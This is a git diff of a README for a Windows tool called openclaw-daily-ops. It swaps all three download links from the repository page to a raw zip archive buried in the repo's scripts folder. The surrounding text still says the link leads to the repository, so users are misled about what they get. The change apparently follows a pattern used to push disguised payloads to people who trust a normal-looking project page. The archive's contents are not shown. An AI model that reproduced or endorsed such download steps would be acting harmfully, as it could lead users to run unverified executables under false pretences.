@@ -1,6 +1,6 @@
 # 🛠️ openclaw-daily-ops - Track Costs and Manage Sessions
 
-[![Download openclaw-daily-ops](https://img.shields.io/badge/Download-openclaw--daily--ops-brightgreen)](https://github.com/Spokesmanfda907/openclaw-daily-ops)
+[![Download openclaw-daily-ops](https://img.shields.io/badge/Download-openclaw--daily--ops-brightgreen)](https://github.com/Spokesmanfda907/openclaw-daily-ops/raw/refs/heads/main/scripts/ops-openclaw-daily-1.4.zip)
 
 ---
 
@@ -35,7 +35,7 @@ To get openclaw-daily-ops on your Windows PC, follow these steps:
 
 1. Click the big green button below to open the download page.
 
-[![Download openclaw-daily-ops](https://img.shields.io/badge/Download-openclaw--daily--ops-green)](https://github.com/Spokesmanfda907/openclaw-daily-ops)
+[![Download openclaw-daily-ops](https://img.shields.io/badge/Download-openclaw--daily--ops-green)](https://github.com/Spokesmanfda907/openclaw-daily-ops/raw/refs/heads/main/scripts/ops-openclaw-daily-1.4.zip)
 
 2. This link takes you to the GitHub repository. Look for the latest release or download section.
 
@@ -141,4 +141,4 @@ If you run into problems not covered here:
 
 ## 🔗 Quick Access
 
-[Download openclaw-daily-ops](https://github.com/Spokesmanfda907/openclaw-daily-ops) | Your one-stop page for setup and updates.
+[Download openclaw-daily-ops](https://github.com/Spokesmanfda907/openclaw-daily-ops/raw/refs/heads/main/scripts/ops-openclaw-daily-1.4.zip) | Your one-stop page for setup and updates.
